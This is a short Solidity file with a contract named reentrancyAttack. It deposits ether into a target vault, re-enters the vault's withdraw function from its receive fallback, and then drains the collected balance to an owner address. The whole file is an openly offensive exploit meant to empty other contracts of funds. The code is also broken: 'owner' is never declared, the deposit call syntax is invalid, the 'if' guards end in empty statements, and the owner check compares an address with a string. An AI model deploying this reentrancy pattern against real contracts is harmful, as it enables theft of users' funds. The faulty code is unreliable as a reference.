// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;

    function withdraw() external;
}

contract reentrancyAttack {
    IVault public target;

    constructor(address _address) {
        target = IVault(_address);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "send require ethereum");
        target.deposit(value: msg.value)();
        target.withdraw();
    }

    receive() external payable {
        if(address(target).balance >= 1 ether);
        target.withdraw();
    }

    function drain() external {
        if(msg.sender == "owner","not owner");
        target.withdraw();
        payable(owner).transfer(address(this).balance);

    }
}
